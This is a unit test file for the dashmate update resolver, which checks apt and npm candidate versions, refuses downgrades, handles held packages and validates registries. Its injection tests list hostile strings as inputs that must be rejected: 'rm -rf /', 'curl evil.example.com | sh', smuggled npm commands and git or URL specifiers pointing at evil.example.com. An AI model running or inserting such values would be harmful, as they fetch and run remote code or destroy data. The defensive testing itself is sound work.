import resolveUpdateCandidate, {
  CANDIDATE_REASON,
  CANDIDATE_SOURCE,
  CANDIDATE_STATE,
  FETCH_STATUS,
  commandOptions,
  debVersionToApplicationVersion,
  defaultFetchJson,
  defaultRunCommand,
} from '../../../src/update/resolveUpdateCandidate.js';
import { INSTALL_METHODS } from '../../../src/update/detectInstallMethod.js';

const CURRENT_VERSION = '4.1.0';
const APT_SOURCES_PATH = '/etc/apt/sources.list.d/dashmate.sources';
const APT_GET_PATH = '/usr/bin/apt-get';
const APT_CACHE_PATH = '/usr/bin/apt-cache';
const DPKG_PATH = '/usr/bin/dpkg';
const DPKG_QUERY_PATH = '/usr/bin/dpkg-query';
const REGISTRY_URL = 'https://registry.npmjs.org';

const SCOPE_ARGS = [
  '-o', `Dir::Etc::sourcelist=${APT_SOURCES_PATH}`,
  '-o', 'Dir::Etc::sourceparts=/dev/null',
  '-o', 'APT::Get::List-Cleanup=0',
  '-o', 'Dir::Cache::pkgcache=',
  '-o', 'Dir::Cache::srcpkgcache=',
];

/**
 * @param {string} method
 * @param {Object} [evidence]
 * @return {Object}
 */
function detection(method, evidence = {}) {
  return {
    method,
    binPath: null,
    updateInstructions: 'update instructions',
    evidence: {
      hasUpdateInstructionsEnv: false,
      hasBinPathEnv: false,
      debPackageConfirmed: null,
      reason: 'detected',
      ...evidence,
    },
  };
}

/**
 * @param {string} candidate
 * @param {string} [installed]
 * @return {string}
 */
function policyOutput(candidate, installed = '4.1.0-1') {
  return [
    'dashmate:',
    `  Installed: ${installed}`,
    `  Candidate: ${candidate}`,
    '  Version table:',
    ` *** ${installed} 500`,
    '        500 https://repo.dash.org/dashmate ./ Packages',
    '        100 /var/lib/dpkg/status',
    '',
  ].join('\n');
}

/**
 * @param {string|number} code
 * @return {Error}
 */
function execError(code) {
  const error = new Error(`command failed with ${code}`);

  error.code = code;

  return error;
}

/**
 * Build a real Response so the fetch defaults exercise the same body handling as production
 *
 * @param {Object|string} body
 * @param {Object} [init]
 * @return {Response}
 */
function jsonResponse(body, init = {}) {
  const payload = typeof body === 'string' ? body : JSON.stringify(body);

  return new Response(payload, {
    status: 200,
    ...init,
    headers: { 'content-type': 'application/json', ...init.headers },
  });
}

/**
 * Build a response whose body is produced on demand, so a test can observe how much of it was
 * read and whether it was released
 *
 * @param {Object} [options]
 * @param {number} [options.chunkSize]
 * @param {number} [options.chunkCount]
 * @param {Object} [options.init]
 * @return {{response: Response, counters: {pulls: number, cancelled: boolean}}}
 */
function streamingResponse({ chunkSize = 64 * 1024, chunkCount = 64, init = {} } = {}) {
  const counters = { pulls: 0, cancelled: false };

  const body = new ReadableStream({
    pull(controller) {
      counters.pulls += 1;

      if (counters.pulls > chunkCount) {
        controller.close();

        return;
      }

      controller.enqueue(new Uint8Array(chunkSize).fill(0x41));
    },
    cancel() {
      counters.cancelled = true;
    },
  });

  return {
    counters,
    response: new Response(body, {
      status: 200,
      ...init,
      headers: { 'content-type': 'application/json', ...init.headers },
    }),
  };
}

describe('resolveUpdateCandidate', () => {
  let runCommand;
  let pathExists;
  let fetchJson;

  /**
   * @param {string} candidate
   * @param {string} [installed]
   */
  function aptOffers(candidate, installed = '4.1.0-1') {
    runCommand.withArgs(APT_CACHE_PATH).resolves(policyOutput(candidate, installed));
  }

  /**
   * @param {Object} [overrides]
   * @return {Promise<Object>}
   */
  function resolveDeb(overrides = {}) {
    return resolveUpdateCandidate({
      installMethod: detection(INSTALL_METHODS.DEB),
      currentVersion: CURRENT_VERSION,
      platform: 'linux',
      env: {},
      isRoot: false,
      runCommand,
      pathExists,
      fetchJson,
      aptSourcesPath: APT_SOURCES_PATH,
      ...overrides,
    });
  }

  /**
   * @param {Object} [overrides]
   * @return {Promise<Object>}
   */
  function resolveNpm(overrides = {}) {
    return resolveUpdateCandidate({
      installMethod: detection(INSTALL_METHODS.NPM),
      currentVersion: CURRENT_VERSION,
      platform: 'linux',
      env: {},
      runCommand,
      pathExists,
      fetchJson,
      registryUrl: REGISTRY_URL,
      ...overrides,
    });
  }

  beforeEach(function beforeEach() {
    runCommand = this.sinon.stub().rejects(new Error('command not stubbed'));
    runCommand.withArgs(APT_GET_PATH).resolves('');
    runCommand.withArgs(APT_CACHE_PATH).resolves(policyOutput('4.2.0-1'));
    // dpkg reports the package as wanted-installed and not held
    runCommand.withArgs(DPKG_QUERY_PATH).resolves('ii ');
    runCommand.withArgs(DPKG_PATH).resolves('');

    pathExists = this.sinon.stub().resolves(true);
    fetchJson = this.sinon.stub().resolves({
      status: FETCH_STATUS.OK,
      body: { name: 'dashmate', version: '4.2.0' },
    });
  });

  describe('deb', () => {
    it('should report an update when apt offers a newer version', async () => {
      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UPDATE_AVAILABLE);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.NEWER_VERSION_AVAILABLE);
      expect(candidate.source).to.equal(CANDIDATE_SOURCE.APT);
      expect(candidate.candidateVersion).to.equal('4.2.0');
      expect(candidate.installableVersion).to.equal('4.2.0');
      expect(candidate.packageVersion).to.equal('4.2.0-1');
      expect(candidate.currentVersion).to.equal(CURRENT_VERSION);
      expect(candidate.prerelease).to.be.false();
      expect(candidate.details.installedPackageVersion).to.equal('4.1.0-1');
    });

    it('should ask apt rather than any other source, scoped to the dashmate sources file', async () => {
      await resolveDeb();

      const [file, args] = runCommand.withArgs(APT_CACHE_PATH).firstCall.args;

      expect(file).to.equal(APT_CACHE_PATH);
      expect(args).to.deep.equal([...SCOPE_ARGS, 'policy', 'dashmate']);
    });

    it('should report up to date when apt offers the running version', async () => {
      aptOffers('4.1.0-1');

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UP_TO_DATE);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.ALREADY_CURRENT);
      expect(candidate.candidateVersion).to.equal('4.1.0');
      expect(candidate.installableVersion).to.be.null();
    });

    it('should refuse a downgrade when apt offers an older version', async () => {
      aptOffers('4.0.0-1');

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UP_TO_DATE);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.CANDIDATE_OLDER);
      expect(candidate.candidateVersion).to.equal('4.0.0');
      expect(candidate.installableVersion).to.be.null();
    });

    it('should report a prerelease of a newer version under its own reason', async () => {
      aptOffers('4.2.0~rc.1-1');

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UPDATE_AVAILABLE);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.PRERELEASE_AVAILABLE);
      expect(candidate.candidateVersion).to.equal('4.2.0-rc.1');
      expect(candidate.installableVersion).to.equal('4.2.0-rc.1');
      expect(candidate.packageVersion).to.equal('4.2.0~rc.1-1');
      expect(candidate.prerelease).to.be.true();
    });

    it('should report a prerelease of the running version as a downgrade', async () => {
      // The tilde sorts below the release for apt too, so both orderings agree here; what must
      // not happen is the tilde being dropped and 4.1.0~rc.4 reading as 4.1.0
      aptOffers('4.1.0~rc.4-1');

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UP_TO_DATE);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.CANDIDATE_OLDER);
      expect(candidate.candidateVersion).to.equal('4.1.0-rc.4');
    });

    it('should refresh apt package lists only when running as root', async () => {
      const candidate = await resolveDeb({ isRoot: true });

      const [file, args] = runCommand.withArgs(APT_GET_PATH).firstCall.args;

      expect(file).to.equal(APT_GET_PATH);
      expect(args).to.deep.equal([...SCOPE_ARGS, '--error-on=any', 'update']);
      expect(candidate.details.listsRefreshed).to.be.true();
    });

    it('should answer from the lists the host already has when it is not root', async () => {
      const candidate = await resolveDeb({ isRoot: false });

      expect(runCommand.withArgs(APT_GET_PATH)).to.have.not.been.called();
      expect(candidate.state).to.equal(CANDIDATE_STATE.UPDATE_AVAILABLE);
      expect(candidate.details.listsRefreshed).to.be.false();
      expect(candidate.details.listsNotRefreshedReason).to.be.a('string');
    });

    it('should still answer when refreshing apt package lists fails', async () => {
      runCommand.withArgs(APT_GET_PATH).rejects(new Error('Could not resolve host'));

      const candidate = await resolveDeb({ isRoot: true });

      expect(candidate.state).to.equal(CANDIDATE_STATE.UPDATE_AVAILABLE);
      expect(candidate.details.listsRefreshed).to.be.false();
      expect(candidate.details.listsNotRefreshedReason).to.have.string('apt-get update failed');
    });

    it('should report unknown when apt is not installed', async () => {
      runCommand.withArgs(APT_CACHE_PATH).rejects(execError('ENOENT'));

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.APT_MISSING);
      expect(candidate.candidateVersion).to.be.null();
    });

    it('should report unknown when apt fails', async () => {
      runCommand.withArgs(APT_CACHE_PATH).rejects(new Error('E: Could not open lock file'));

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.APT_FAILED);
      expect(candidate.candidateVersion).to.be.null();
    });

    it('should report unknown when the dashmate apt sources file is absent', async () => {
      pathExists.resolves(false);

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.APT_SOURCES_MISSING);
      expect(runCommand).to.have.not.been.called();
    });

    it('should report unknown when apt has no candidate version', async () => {
      aptOffers('(none)', '(none)');

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.APT_NO_CANDIDATE);
      expect(candidate.candidateVersion).to.be.null();
    });

    it('should say the lists were never refreshed when that is why apt has no candidate', async () => {
      aptOffers('(none)', '(none)');

      const candidate = await resolveDeb({ isRoot: false });

      expect(candidate.message).to.have.string('not running as root');
    });

    it('should report unknown when apt-cache output carries no candidate line', async () => {
      runCommand.withArgs(APT_CACHE_PATH)
        .resolves('dashmate:\n  Installed: 4.1.0-1\n  Version table:\n');

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.APT_OUTPUT_MALFORMED);
    });

    it('should read the first candidate line rather than a later one', async () => {
      // apt is asked about one package, so a second stanza is not something to merge into the
      // answer: whatever it belongs to, the package asked about is reported first
      runCommand.withArgs(APT_CACHE_PATH).resolves([
        policyOutput('4.2.0-1'),
        'dashmate-nightly:',
        '  Installed: (none)',
        '  Candidate: 9.9.9-1',
        '',
      ].join('\n'));

      const candidate = await resolveDeb();

      expect(candidate.candidateVersion).to.equal('4.2.0');
    });

    it('should report unknown when apt-cache prints nothing', async () => {
      runCommand.withArgs(APT_CACHE_PATH).resolves('');

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.APT_NO_CANDIDATE);
    });

    it('should report unknown when apt-cache reports something that is not a package version', async () => {
      aptOffers('4.2.0-1 ; rm -rf /');

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.APT_OUTPUT_MALFORMED);
      expect(candidate.candidateVersion).to.be.null();
      expect(candidate.packageVersion).to.be.null();
    });

    it('should report an installed field that is not a package version rather than dropping it', async () => {
      aptOffers('4.2.0-1', 'not a version');

      const candidate = await resolveDeb();

      expect(candidate.details.installedPackageVersion).to.be.null();
      expect(candidate.details.installedPackageVersionReported).to.equal('not a version');
    });

    it('should report unknown rather than a truncated version for the legacy deb scheme', async () => {
      // The version oclif used to emit carries a git sha where a prerelease tag belongs, and
      // shortening it to 4.1.0 would equate a release with an arbitrary build of it
      aptOffers('4.1.0.bfc80249b9-1');

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.DEB_VERSION_UNMAPPABLE);
      expect(candidate.candidateVersion).to.be.null();
      expect(candidate.packageVersion).to.equal('4.1.0.bfc80249b9-1');
    });

    it('should not resolve a deb candidate on a platform that has no apt', async () => {
      const candidate = await resolveDeb({ platform: 'darwin' });

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.UNSUPPORTED_PLATFORM);
      expect(runCommand).to.have.not.been.called();
    });
  });

  describe('deb rebuilds of the running version', () => {
    it('should report a rebuild of the installed package as an update', async () => {
      // A rebuild carries the same application version, so the semver comparison finds nothing
      // while apt has a package to install - which is how a fix to anything bundled in the deb,
      // the Node runtime above all, reaches a node
      aptOffers('4.1.0-2', '4.1.0-1');

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UPDATE_AVAILABLE);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.PACKAGE_REBUILD_AVAILABLE);
      expect(candidate.candidateVersion).to.equal('4.1.0');
      expect(candidate.installableVersion).to.equal('4.1.0');
      expect(candidate.packageVersion).to.equal('4.1.0-2');
      expect(candidate.details.installedPackageVersion).to.equal('4.1.0-1');
    });

    it('should ask dpkg, not semver, which package version is newer', async () => {
      aptOffers('4.1.0-2', '4.1.0-1');

      await resolveDeb();

      const [file, args] = runCommand.withArgs(DPKG_PATH).firstCall.args;

      expect(file).to.equal(DPKG_PATH);
      expect(args).to.deep.equal(['--compare-versions', '4.1.0-2', 'gt', '4.1.0-1']);
    });

    it('should stay up to date when dpkg says the offered package is not newer', async () => {
      // A pool that pruned the installed revision can offer an older one, and refusing that is
      // the same downgrade rule applied at the package level
      aptOffers('4.1.0-1', '4.1.0-2');
      runCommand.withArgs(DPKG_PATH).rejects(execError(1));

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UP_TO_DATE);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.ALREADY_CURRENT);
      expect(candidate.installableVersion).to.be.null();
    });

    it('should report unknown when dpkg cannot say which package version is newer', async () => {
      aptOffers('4.1.0-2', '4.1.0-1');
      runCommand.withArgs(DPKG_PATH).rejects(execError('ENOENT'));

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.PACKAGE_REBUILD_UNDETERMINED);
      expect(candidate.installableVersion).to.be.null();
    });

    it('should not look for a rebuild when the package versions are identical', async () => {
      aptOffers('4.1.0-1', '4.1.0-1');

      const candidate = await resolveDeb();

      expect(candidate.reason).to.equal(CANDIDATE_REASON.ALREADY_CURRENT);
      expect(runCommand.withArgs(DPKG_PATH)).to.have.not.been.called();
    });

    it('should not look for a rebuild when the application versions differ', async () => {
      await resolveDeb();

      expect(runCommand.withArgs(DPKG_PATH)).to.have.not.been.called();
    });
  });

  describe('held packages', () => {
    it('should refuse to call an update installable while the package is held', async () => {
      runCommand.withArgs(DPKG_QUERY_PATH).resolves('hi ');

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.PACKAGE_HELD);
      expect(candidate.candidateVersion).to.equal('4.2.0');
      expect(candidate.installableVersion).to.be.null();
      expect(candidate.details.held).to.be.true();
    });

    it('should ask dpkg whether the package is held', async () => {
      await resolveDeb();

      const [file, args] = runCommand.withArgs(DPKG_QUERY_PATH).firstCall.args;

      expect(file).to.equal(DPKG_QUERY_PATH);
      // eslint-disable-next-line no-template-curly-in-string
      expect(args).to.deep.equal(['-W', '-f=${db:Status-Abbrev}', 'dashmate']);
    });

    it('should not spend a child process on the hold when there is nothing to install', async () => {
      aptOffers('4.1.0-1');

      await resolveDeb();

      expect(runCommand.withArgs(DPKG_QUERY_PATH)).to.have.not.been.called();
    });

    it('should report the update when the hold cannot be determined', async () => {
      runCommand.withArgs(DPKG_QUERY_PATH).rejects(execError('ENOENT'));

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UPDATE_AVAILABLE);
      expect(candidate.details.held).to.be.null();
    });
  });

  describe('debian version mapping', () => {
    it('should map a Debian package version onto the application version it packages', () => {
      expect(debVersionToApplicationVersion('4.1.0-1')).to.equal('4.1.0');
      expect(debVersionToApplicationVersion('4.1.0-2')).to.equal('4.1.0');
      expect(debVersionToApplicationVersion('4.1.0~rc.3-1')).to.equal('4.1.0-rc.3');
      expect(debVersionToApplicationVersion('1:4.2.0~beta.1-1')).to.equal('4.2.0-beta.1');
      expect(debVersionToApplicationVersion('4.1.0')).to.equal('4.1.0');
    });

    it('should keep a hyphenated prerelease tag whole and drop only the Debian revision', () => {
      expect(debVersionToApplicationVersion('4.1.0~rc.1-7')).to.equal('4.1.0-rc.1');
      expect(debVersionToApplicationVersion('4.1.0-rc.1-7')).to.equal('4.1.0-rc.1');
    });

    it('should refuse a package version whose epoch is not an epoch', () => {
      // Everything before the colon is dropped, so accepting anything there would let the part
      // that decides the version be chosen by whatever came before it
      expect(debVersionToApplicationVersion('1a:4.1.0-1')).to.be.null();
      expect(debVersionToApplicationVersion('4.1:0-1')).to.be.null();
    });

    it('should refuse a package version carrying more than one tilde', () => {
      // Only the first tilde is the prerelease separator; translating the rest would turn a
      // version this scheme never produces into one that parses
      expect(debVersionToApplicationVersion('4.1.0~rc~3-1')).to.be.null();
      expect(debVersionToApplicationVersion('4.1.0~rc.1~exp-1')).to.be.null();
    });

    it('should refuse a package version that carries no application version', () => {
      expect(debVersionToApplicationVersion('4.1.0.bfc80249b9-1')).to.be.null();
      expect(debVersionToApplicationVersion('4.1~0~rc.3-1')).to.be.null();
      expect(debVersionToApplicationVersion('git+https://example.com/x.git-1')).to.be.null();
      expect(debVersionToApplicationVersion('a:4.1.0-1')).to.be.null();
      expect(debVersionToApplicationVersion('')).to.be.null();
      expect(debVersionToApplicationVersion(null)).to.be.null();
    });
  });

  describe('npm', () => {
    it('should report an update when the registry offers a newer version', async () => {
      const candidate = await resolveNpm();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UPDATE_AVAILABLE);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.NEWER_VERSION_AVAILABLE);
      expect(candidate.source).to.equal(CANDIDATE_SOURCE.NPM_REGISTRY);
      expect(candidate.candidateVersion).to.equal('4.2.0');
      expect(candidate.installableVersion).to.equal('4.2.0');
      expect(fetchJson).to.have.been.calledOnceWith(`${REGISTRY_URL}/dashmate/latest`);
    });

    it('should report up to date when the registry offers the running version', async () => {
      fetchJson.resolves({ status: FETCH_STATUS.OK, body: { name: 'dashmate', version: '4.1.0' } });

      const candidate = await resolveNpm();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UP_TO_DATE);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.ALREADY_CURRENT);
      expect(candidate.installableVersion).to.be.null();
    });

    it('should refuse a downgrade and never hand the older version back as installable', async () => {
      // A dist tag can be moved back to an older release, and apt's refusal to downgrade
      // does not cover this channel. The version is reported for display, but the field a
      // caller installs from stays empty.
      fetchJson.resolves({ status: FETCH_STATUS.OK, body: { name: 'dashmate', version: '4.0.5' } });

      const candidate = await resolveNpm();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UP_TO_DATE);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.CANDIDATE_OLDER);
      expect(candidate.candidateVersion).to.equal('4.0.5');
      expect(candidate.installableVersion).to.be.null();
    });

    it('should report a prerelease of a newer version under its own reason', async () => {
      fetchJson.resolves({
        status: FETCH_STATUS.OK,
        body: { name: 'dashmate', version: '4.2.0-rc.1' },
      });

      const candidate = await resolveNpm();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UPDATE_AVAILABLE);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.PRERELEASE_AVAILABLE);
      expect(candidate.candidateVersion).to.equal('4.2.0-rc.1');
      expect(candidate.prerelease).to.be.true();
    });

    it('should report unknown when the registry cannot be reached', async () => {
      fetchJson.resolves({ status: FETCH_STATUS.NETWORK_ERROR, message: 'getaddrinfo ENOTFOUND' });

      const candidate = await resolveNpm();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.REGISTRY_UNREACHABLE);
      expect(candidate.candidateVersion).to.be.null();
    });

    it('should report unknown when the registry answers with an error status', async () => {
      fetchJson.resolves({ status: FETCH_STATUS.HTTP_ERROR, statusCode: 403 });

      const candidate = await resolveNpm();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.REGISTRY_ERROR);
    });

    it('should report a rate limit as its own reason', async () => {
      fetchJson.resolves({ status: FETCH_STATUS.HTTP_ERROR, statusCode: 429 });

      const candidate = await resolveNpm();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.REGISTRY_RATE_LIMITED);
    });

    it('should report a registry that does not carry the package yet as its own reason', async () => {
      // npm publishes about an hour after a release is tagged, so this is the normal answer in
      // the window between the two and must not read like a fault
      fetchJson.resolves({ status: FETCH_STATUS.HTTP_ERROR, statusCode: 404 });

      const candidate = await resolveNpm();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.REGISTRY_PACKAGE_MISSING);
    });

    it('should report an oversized response as its own reason', async () => {
      fetchJson.resolves({ status: FETCH_STATUS.TOO_LARGE });

      const candidate = await resolveNpm();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.REGISTRY_RESPONSE_TOO_LARGE);
    });

    it('should report unknown when the registry answers with an unusable document', async () => {
      fetchJson.resolves({ status: FETCH_STATUS.MALFORMED, message: 'Unexpected token <' });

      const candidate = await resolveNpm();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.REGISTRY_RESPONSE_MALFORMED);
    });

    it('should report unknown when the registry answers about another package', async () => {
      fetchJson.resolves({
        status: FETCH_STATUS.OK,
        body: { name: 'not-dashmate', version: '9.9.9' },
      });

      const candidate = await resolveNpm();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.REGISTRY_RESPONSE_MALFORMED);
      expect(candidate.candidateVersion).to.be.null();
    });

    it('should report unknown when the registry response carries no version', async () => {
      fetchJson.resolves({ status: FETCH_STATUS.OK, body: { name: 'dashmate' } });

      const candidate = await resolveNpm();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.INVALID_VERSION);
    });
  });

  describe('npm registry selection', () => {
    it('should ask the registry npm itself would install from', async () => {
      const candidate = await resolveNpm({
        registryUrl: null,
        env: { npm_config_registry: 'https://npm.internal.example.com/' },
      });

      expect(fetchJson).to.have.been.calledOnceWith('https://npm.internal.example.com/dashmate/latest');
      expect(candidate.details.registryUrlSource).to.equal('environment');
    });

    it('should accept the uppercase spelling of the registry variable', async () => {
      await resolveNpm({
        registryUrl: null,
        env: { NPM_CONFIG_REGISTRY: 'https://npm.internal.example.com' },
      });

      expect(fetchJson).to.have.been.calledOnceWith('https://npm.internal.example.com/dashmate/latest');
    });

    it('should default to the public registry when nothing configures one', async () => {
      const candidate = await resolveNpm({ registryUrl: null, env: {} });

      expect(fetchJson).to.have.been.calledOnceWith(`${REGISTRY_URL}/dashmate/latest`);
      expect(candidate.details.registryUrlSource).to.equal('default');
    });

    [
      'http://npm.internal.example.com',
      'file:///tmp/registry',
      'https://user:password@npm.internal.example.com',
      'not a url',
      // eslint-disable-next-line no-script-url
      'javascript:alert(1)',
    ].forEach((configured) => {
      it(`should ignore ${JSON.stringify(configured)} as a registry`, async () => {
        const candidate = await resolveNpm({
          registryUrl: null,
          env: { npm_config_registry: configured },
        });

        expect(fetchJson).to.have.been.calledOnceWith(`${REGISTRY_URL}/dashmate/latest`);
        expect(candidate.details.registryUrlSource).to.equal('default');
        expect(candidate.details.registryUrlIgnored).to.equal(configured);
      });
    });
  });

  describe('version validation', () => {
    // Whatever the registry answers ends up as `dashmate@<version>` on an npm command line,
    // where npm treats these specifiers as places to install code from rather than versions
    const injectionVectors = [
      'git+https://evil.example.com/dashmate.git',
      'git+ssh://git@evil.example.com/dashmate.git#4.2.0',
      'file:../../../tmp/dashmate',
      'npm:evil-package@latest',
      'https://evil.example.com/dashmate-4.2.0.tgz',
      'http://evil.example.com/x.tgz',
      '4.2.0 && curl evil.example.com | sh',
      '--registry=https://evil.example.com',
      '@evil/dashmate@4.2.0',
      'latest',
      '*',
      '>=4.2.0',
      '01.2.3',
      '4.2',
      ' 4.2.0',
      '4.2.0 ',
      '4.2.0\t',
      '4.2.0\u0000',
      '4.2.0\u001b[31m',
      '4.2.0\nnpm install evil',
      '4.2.0\u202e',
    ];

    injectionVectors.forEach((vector) => {
      it(`should reject ${JSON.stringify(vector)} instead of treating it as a version`, async () => {
        fetchJson.resolves({
          status: FETCH_STATUS.OK,
          body: { name: 'dashmate', version: vector },
        });

        const candidate = await resolveNpm();

        expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
        expect(candidate.reason).to.equal(CANDIDATE_REASON.INVALID_VERSION);
        expect(candidate.candidateVersion).to.be.null();
        expect(candidate.installableVersion).to.be.null();
      });
    });

    it('should never let a rejected version reach the message it prints', async () => {
      fetchJson.resolves({
        status: FETCH_STATUS.OK,
        body: { name: 'dashmate', version: '4.2.0\u001b[2J\u0007\u202edrop' },
      });

      const candidate = await resolveNpm();

      // eslint-disable-next-line no-control-regex
      expect(/[\u0000-\u001f\u007f-\u009f\u202a-\u202e]/.test(candidate.message)).to.be.false();
      expect(candidate.message).to.have.string('4.2.0[2Jdrop');
    });

    it('should reject a version apt reports that is not a Debian version', async () => {
      aptOffers('git+https://evil.example.com/dashmate.git');

      const candidate = await resolveDeb();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.APT_OUTPUT_MALFORMED);
      expect(candidate.candidateVersion).to.be.null();
      expect(candidate.packageVersion).to.be.null();
    });

    it('should report unknown when the running version cannot be compared', async () => {
      const candidate = await resolveNpm({ currentVersion: 'not-a-version' });

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.CURRENT_VERSION_INVALID);
      expect(fetchJson).to.have.not.been.called();
    });
  });

  describe('channels that cannot be asked', () => {
    [INSTALL_METHODS.TARBALL, INSTALL_METHODS.UNKNOWN].forEach((method) => {
      it(`should report unknown for a ${method} install rather than guessing a version`, async () => {
        const candidate = await resolveUpdateCandidate({
          installMethod: detection(method),
          currentVersion: CURRENT_VERSION,
          platform: 'linux',
          env: {},
          runCommand,
          pathExists,
          fetchJson,
        });

        expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
        expect(candidate.reason).to.equal(CANDIDATE_REASON.UNSUPPORTED_INSTALL_METHOD);
        expect(candidate.method).to.equal(method);
        expect(candidate.updateInstructions).to.equal('update instructions');
        expect(runCommand).to.have.not.been.called();
        expect(fetchJson).to.have.not.been.called();
      });
    });

    [
      { hasBinPathEnv: true, hasUpdateInstructionsEnv: true },
      { debPackageConfirmed: false },
      { hasUpdateInstructionsEnv: true, debPackageConfirmed: null },
    ].forEach((evidence) => {
      it(`should separate an ambiguous install from one with no channel: ${JSON.stringify(evidence)}`, async () => {
        // A caller acting on non-interactive consent must refuse this case: the host may hold
        // more than one dashmate, so an upgrade could patch the copy that is not running
        const candidate = await resolveUpdateCandidate({
          installMethod: detection(INSTALL_METHODS.UNKNOWN, evidence),
          currentVersion: CURRENT_VERSION,
          platform: 'linux',
          env: {},
          runCommand,
          pathExists,
          fetchJson,
        });

        expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
        expect(candidate.reason).to.equal(CANDIDATE_REASON.AMBIGUOUS_INSTALL_METHOD);
      });
    });

    it('should carry the detection evidence so a caller can report which install it decided about', async () => {
      const candidate = await resolveDeb({
        installMethod: detection(INSTALL_METHODS.DEB, { packageRootDir: '/usr/lib/dashmate' }),
      });

      expect(candidate.details.installMethodEvidence.packageRootDir).to.equal('/usr/lib/dashmate');
    });
  });

  describe('install method detection', () => {
    it('should detect the install method when a caller does not supply one', async function it() {
      const detect = this.sinon.stub().resolves(detection(INSTALL_METHODS.NPM));

      const candidate = await resolveUpdateCandidate({
        currentVersion: CURRENT_VERSION,
        platform: 'linux',
        env: {},
        detect,
        runCommand,
        pathExists,
        fetchJson,
        registryUrl: REGISTRY_URL,
      });

      expect(detect).to.have.been.calledOnceWith({ platform: 'linux', env: {} });
      expect(candidate.state).to.equal(CANDIDATE_STATE.UPDATE_AVAILABLE);
      expect(candidate.method).to.equal(INSTALL_METHODS.NPM);
    });

    it('should not detect again when a caller supplies a detection', async function it() {
      // Detection costs a dpkg probe, and a second one could disagree with the first
      const detect = this.sinon.stub().resolves(detection(INSTALL_METHODS.DEB));

      await resolveNpm({ detect });

      expect(detect).to.have.not.been.called();
    });

    it('should report unknown rather than throw when detection fails', async function it() {
      const detect = this.sinon.stub().rejects(new Error('dpkg exploded'));

      const candidate = await resolveUpdateCandidate({
        currentVersion: CURRENT_VERSION,
        platform: 'linux',
        env: {},
        detect,
        runCommand,
        pathExists,
        fetchJson,
      });

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
